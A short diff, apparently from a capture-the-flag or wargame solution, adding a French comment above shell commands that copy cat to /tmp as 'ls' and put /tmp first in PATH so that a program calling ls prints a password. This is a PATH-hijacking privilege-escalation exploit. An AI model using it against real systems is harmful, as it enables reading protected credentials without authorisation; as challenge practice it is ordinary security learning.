@@ -1,3 +1,6 @@
+## On va copier la cmd cat dans le dossier tmp puis on va l'appeler ls, ensuite on rajoute /tmp au Path ainsi le programme va appeler le ls de /tmp qui correspond en realite a un cat et va ressortir le mot de passe
+
+
 cp /bin/cat /tmp
 mv /tmp/cat /tmp/ls
 export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/opt/tools/checksec/
